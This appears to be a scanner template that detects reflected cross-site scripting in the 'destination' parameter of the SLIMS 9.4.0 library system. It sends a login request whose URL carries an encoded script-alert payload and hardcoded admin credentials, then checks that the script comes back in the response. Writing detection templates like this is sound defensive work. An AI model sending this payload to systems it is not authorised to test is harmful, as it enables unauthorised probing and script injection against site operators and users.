id: slims-xss
brief:
    title: Senayan Library Management System v9.4.0(SLIMS 9) - Cross Site Scripting
    by: arafatansari
    level: medium
    about: SLIMS 9 was discovered to contain `destination` request parameter that copies the value of an HTML tag attribute which is encapsulated in double quotation marks.
    label:
        - senayan
        - packetstorm
        - xss
        - slims
        - vuln
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/index.php?_csrf_token_645a83a41868941e4692aa31e7235f2=6a50886006f02202a6dac5cfa07bcbfb1e2a6e84&destination=zbuip%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Ejgoihbmmygljgoihbmmygl&logMeIn=Login&memberID=admin&memberPassWord=password&p=member'
      signs:
        - "on": word
          has:
            - <script>alert(document.domain)</script>
            - SLiMS
          in: body
          need: all
        - "on": word
          has:
            - text/html
          in: header
          need: all
        - "on": status
          status:
            - 200
